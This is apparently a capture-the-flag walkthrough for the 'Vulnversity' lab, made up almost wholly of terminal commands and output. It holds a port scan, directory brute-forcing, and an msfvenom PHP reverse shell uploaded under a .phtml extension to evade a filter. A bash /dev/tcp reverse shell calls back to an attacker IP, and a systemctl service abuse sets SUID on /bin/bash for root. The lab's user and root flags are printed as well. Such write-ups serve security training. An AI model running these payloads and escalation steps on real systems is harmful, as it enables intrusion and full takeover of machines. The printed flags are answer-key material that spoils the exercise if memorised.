```
Vulnversity.

(root㉿kali)-[/home/kali] └─# ping -c 1 10.112.171.149

PING 10.112.171.149 (10.112.171.149) 56(84) bytes of data.
64 bytes from 10.112.171.149: icmp_seq=1 ttl=62 time=22.5 ms


┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sS -sC -sV --open --min-rate=2000 -vvv -Pn 10.112.171.149

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 3.0.5
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu
139/tcp  open  netbios-ssn  Samba smbd 4
445/tcp  open  netbios-ssn  Samba smbd 4
3128/tcp open  http-proxy   Squid http proxy 4.10
3333/tcp open  http         Apache httpd 2.4.41 ((Ubuntu))


Ports open:

21 FTP  
22 SSH  
139 Samba  
445 Samba  
3128 Proxy  
3333 Apache


┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.112.171.149:3333/ \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x txt,py,php

Starting gobuster in directory enumeration mode

/.php (Status: 403)
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)


We navigate to the internal directory and find that file uploads are enabled.

msfvenom -p php/reverse_php LHOST=192.168.188.156 LPORT=443 -f raw > vulnversity.php

mv vulnversity.php vulnversity.phtml

http://10.112.171.149:3333/internal/uploads/


┌──(root㉿kali)-[/home/kali]
└─# nc -nlvp 443

listening on [any] 443 ...
connect to [192.168.188.156] from (UNKNOWN) [10.112.171.149] 51402


bash -c "sh -i >& /dev/tcp/192.168.188.156/444 0>&1"


┌──(root㉿kali)-[/home/kali]
└─# nc -nlvp 444

listening on [any] 444 ...
connect to [192.168.188.156] from (UNKNOWN) [10.114.158.69] 37372
sh: 0: can't access tty; job control turned off


$ find / -perm -4000 2>/dev/null


$ script /dev/null -c bash

┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo; fg

reset xterm

export SHELL=bash
export TERM=xterm


www-data@ip-10-114-158-69:/var/www/html/internal/uploads$

TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF


www-data@ip-10-114-158-69:/tmp$

bash escalada.vulnversity.sh


www-data@ip-10-114-158-69:/tmp$

bash -p


bash-5.0# whoami
root


bash-5.0# cd /home
bash-5.0# ls
bill ubuntu


bash-5.0# cd /home/bill
bash-5.0# ls
user.txt


bash-5.0# cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb


bash-5.0# cd /root
bash-5.0# ls
root.txt snap


bash-5.0# cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
```
